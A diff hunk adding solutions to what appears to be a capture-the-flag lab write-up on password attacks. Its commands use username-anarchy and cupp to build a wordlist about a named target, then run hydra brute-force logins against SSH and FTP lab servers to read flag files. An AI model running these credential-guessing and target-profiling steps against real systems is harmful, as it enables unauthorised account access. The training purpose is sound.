@@ -76,11 +76,63 @@ hydra -l user -P /usr/share/wordlists/rockyou.txt -f 83.136.254.230 -s 42335 htt
 >**Q. As you now have the name of an employee, try to gather basic information about them, and generate a custom password wordlist that meets the password policy. Also use 'usernameGenerator' to generate potential usernames for the employee. Finally, try to brute force the SSH server shown above to get the flag.**
 
 ```bash
+git clone https://github.com/urbanadventurer/username-anarchy.git
+cd username-anarchy
+./username-anarchy Harry Potter > usernameHarry.txt
+cp usernameHarry.txt ../
+```
 
+```bash
+cupp -i
+```
+
+```bash
+> First Name: Harry
+> Surname: Potter
+> Nickname: 
+> Birthdate (DDMMYYYY): 
+
+
+> Partners) name: 
+> Partners) nickname: 
+> Partners) birthdate (DDMMYYYY): 
+
+
+> Child's name: 
+> Child's nickname: 
+> Child's birthdate (DDMMYYYY): 
+
+
+> Pet's name: 
+> Company name: 
+
+
+> Do you want to add some key words about the victim? Y/[N]: 
+> Do you want to add special chars at the end of words? Y/[N]: y
+> Do you want to add some random numbers at the end of words? Y/[N]:n
+> Leet mode? (i.e. leet = 1337) Y/[N]: Y
+```
+
+```bash
+hydra -L usernameHarry.txt -P harry.txt -u -f ssh://83.136.255.177:36015 -t 4
+```
+
+```bash
+ssh username@83.136.255.177 -p 36015
+ls
+cat flag.txt
 ```
 
 >**Q. Once you are in, you should find that another user exists in server. Try to brute force their login, and get their flag.**
 
 ```bash
-
+ls /home
+netstat -antp | grep -i list
+hydra -l g.potter -P rockyou-30.txt -u -f ftp://0.0.0.0
+ftp 0.0.0.0
+ls
+get flag.txt
+exit
+ls
+cat flag.txt
 ```
